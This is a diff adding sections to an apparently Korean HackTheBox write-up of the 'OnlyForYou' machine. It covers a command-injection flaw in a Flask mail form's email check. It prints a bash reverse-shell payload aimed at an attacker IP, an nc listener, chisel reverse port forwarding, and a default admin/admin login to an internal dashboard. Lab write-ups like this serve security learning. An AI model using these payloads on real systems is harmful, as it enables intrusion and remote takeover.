@@ -373,9 +373,11 @@ def index():
 # ... SKIP ...
 ```
 
-위 소스코드는 메인 페이지에서 이메일, 제목, 메시지 를 받아, `form.py` 의 `sendmessage()` 함수를 통해 메일을 전송하는 구조이다.
+위 소스코드는 메인 페이지에서 이메일, 제목, 메시지 를 받아, `sendmessage()` 함수를 통해 메일을 전송하는 구조이다.
 
-이후 `sendmessage()` 함수 로직을 알아내기 위하여 `/var/www/only4you.htb/form.py` 경로로 이동한 후 소스코드를 분석하였다.
+해당 함수는 파일 상단에서 `form` 이라는 이름의 모듈에서 `import` 된다.
+
+이후 `/var/www/only4you.htb/form.py` 경로로 이동한 후 소스코드를 분석하였다.
 
 <details style="border: 1px solid #ccc; padding: 0.5em; border-radius: 5px;">  
     <summary style="font-weight: bold; cursor: pointer;">form.py 코드는 다음과 같다:</summary>
@@ -461,3 +463,145 @@ def sendmessage(email, subject, message, ip):
 <br>
 
 
+`form.py` 소스를 살펴본 결과 취약한 코드가 담겨져 있다:
+
+```python
+def issecure(email, ip):
+	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
+		return 0
+	else:
+		domain = email.split("@", 1)[1]
+		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+		output = result.stdout.decode('utf-8')
+		if "v=spf1" not in output:
+			return 1
+# ... SKIP ...
+```
+
+이메일이 정규식 패턴을 만족할 경우, `else` 구문으로 진입하여 도메인 부분에 대해 `dig` 명령어를 실행하는 구조이다.
+
+`python3` 환경에서 정규식을 테스트하기 위해 간단한 `issecure()` 함수를 정의하여 이메일 형식을 검증하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/python.png)
+
+`; sleep 3` 과 같은 명령어가 포함된 이메일 주소도 정규표현식을 통과하여 **The email is correct!** 라고 출력된다. 이는 곧 **Command Injection** 의 가능성을 나타낸다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/issecure.png)
+
+---
+
+# Exploitation
+
+## only4you.htb - Command Injection (RCE)
+
+처음 열거했던 `only4you.htb` 도메인의 이메일 입력란에 리버스 셸을 삽입하였다:
+
+```bash
+jisang@only4you.htb; bash -c 'bash -i >& /dev/tcp/10.10.14.20/9001 0>&1'
+```
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/revshell.png)
+
+HTML `email` 입력 필드에는 기본적으로 이메일 형식을 제한하는 `type="email"` 속성이 존재하므로, 개발자 도구(F12)를 사용하여 해당 속성을 제거하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/type-none.png)
+
+이후 나의 터미널에서 `nc` 명령어를 사용하여 포트를 열어 대기하였다:
+
+```bash
+$ nc -lvnp 9001
+```
+
+그리고 웹 페이지에서 **Send Message** 버튼을 클릭하면, 삽입된 명령어가 실행되어 리버스 셸이 연결되며 `www-data` 셸 획득에 성공하였다.
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/webshell.png)
+
+---
+
+# Privilege Escalation
+
+## www-data → john Lateral Movement
+
+`www-data` 셸을 획득한 뒤, 아래 명령어를 통해 인터랙티브 셸로 업그레이드하였다:
+
+```bash
+www-data@only4you:~/only4you.htb$ python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+
+### Internal Network Enumeration
+
+`netstat` 명령어를 사용하여 현재 열려 있는 로컬 포트 및 서비스를 확인하였다:
+
+```bash
+www-data@only4you:~/only4you.htb$ netstat -tul 
+
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:3000          0.0.0.0:*               LISTEN     
+tcp        0      0 localhost:8001          0.0.0.0:*               LISTEN     
+tcp6       0      0 127.0.0.1:7687          [::]:*                  LISTEN     
+tcp6       0      0 127.0.0.1:7474          [::]:*                  LISTEN     
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
+udp        0      0 localhost:domain        0.0.0.0:*                          
+udp        0      0 0.0.0.0:bootpc          0.0.0.0:*    
+```
+
+의심스러운 포트인 `3000`, `8001`, `7687`, `7474` 등이 localhost 바인딩으로 열려 있는 것을 확인하였다. 
+
+이는 외부에서는 접근할 수 없지만, 내부에서 실행 중인 웹 애플리케이션일 가능성이 크다.
+
+### Port Forwarding
+
+위 정보를 바탕으로 [chisel](https://github.com/jpillora/chisel) 도구를 이용하여 포트 포워딩을 수행하였다.
+
+먼저, 내 터미널에서 **Server 모드**의 `chisel`을 실행하였다:
+
+```bash
+$ ./chisel server -p 8000 --reverse
+```
+
+그 후, 웹 셸이 연결된 대상 서버에서 **Client 모드**로 내부 포트를 바깥으로 포워딩하였다:
+
+```bash
+www-data@only4you:~/only4you.htb$ ./chisel client 10.10.14.20:8000 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474
+```
+
+이후 공격자 측 `chisel` 서버 터미널에서 아래와 같이 포트가 정상적으로 포워딩되고 있음을 확인할 수 있다:
+
+```bash
+2025/10/26 15:53:15 server: Reverse tunnelling enabled
+2025/10/26 15:53:15 server: Fingerprint Drswy/YRWz4T9JsG/ziXlFKq02cOs3cIs8yRj5BxSbo=
+2025/10/26 15:53:15 server: Listening on http://0.0.0.0:8000
+2025/10/26 15:55:19 server: session#1: tun: proxy#R:3000=>3000: Listening
+2025/10/26 15:55:19 server: session#1: tun: proxy#R:8001=>8001: Listening
+2025/10/26 15:55:19 server: session#1: tun: proxy#R:7474=>7474: Listening
+```
+
+### Exploring Forwarded Web Applications
+
+먼저 `3000` 포트에 서비스되고 있는 웹 애플리케이션에 접근하였다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/gogs.png)
+
+해당 웹사이트는 **Gogs**라는 Git 저장소 관리 도구로, 내부에서 운영되는 Git 서비스인 것으로 보인다.
+
+사용자 목록을 확인한 결과, `administrator` 계정과 `john` 이라는 일반 사용자가 등록되어 있는 것을 확인할 수 있었다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/gogs-user.png)
+
+`7474` 포트에 접근하자 Neo4j 웹 인터페이스가 나타났다. 이는 웹 기반의 `Neo4j Browser`로, 그래프 데이터베이스와 상호작용할 수 있는 콘솔을 제공한다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/neo4j.png)
+
+`8001` 포트에서는 내부용 로그인 페이지가 나타났다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/onlyforyou-localhost.png)
+
+로그인 페이지에서 `admin/admin` 을 사용한 결과, 로그인에 성공하였고 `/dashboard` 경로로 리다이렉트되었다:
+
+![OnlyForYou](/assets/htb-linux/onlyforyou/onlyforyou-dashboard.png)
